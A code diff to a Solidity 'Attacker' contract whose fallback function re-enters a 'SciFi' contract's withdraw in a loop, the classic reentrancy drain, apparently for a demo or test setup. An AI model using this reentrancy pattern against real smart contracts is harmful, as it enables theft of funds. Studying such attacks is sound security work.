@@ -9,16 +9,13 @@ contract Attacker {
   address public transferAddress;
 
   uint[] public arr;
-  uint public a     = 0;
+  uint public a = 0;
 
   function () payable {
-    DefaultFunc(msg.sender,msg.value,a,SciFi(scifiAddress).balances(this)-1);
+    DefaultFunc(msg.sender,msg.value,a,SciFi(scifiAddress).getBalance(this)-1);
     while (a<5) {
       a++;
-      arr.push(a); //to help debug
-      if (a==4){
-          SciFi(scifiAddress).transferTokens(transferAddress,SciFi(scifiAddress).balances(this)-1);
-      }
+      arr.push(a);
       SciFi(scifiAddress).withdraw(this);
     }
   }
@@ -36,16 +33,16 @@ contract Attacker {
     return true;
   }
 
-  function buyDAOTokens(uint _amount){
-    SciFi(scifiAddress).vote.value(_amount)('');
+  function vote(bytes32 name, uint _amount){
+    SciFi(scifiAddress).vote.value(_amount)(name);
   }
 
   function resetA() {
-    a               =0;
+    a = 0;
   }
 
   function setSciFiAddress(address _scifi){
-    scifiAddress      = _scifi;
+    scifiAddress = _scifi;
   }
   function setTransferAddress(address _transferAddress){
     transferAddress =_transferAddress;
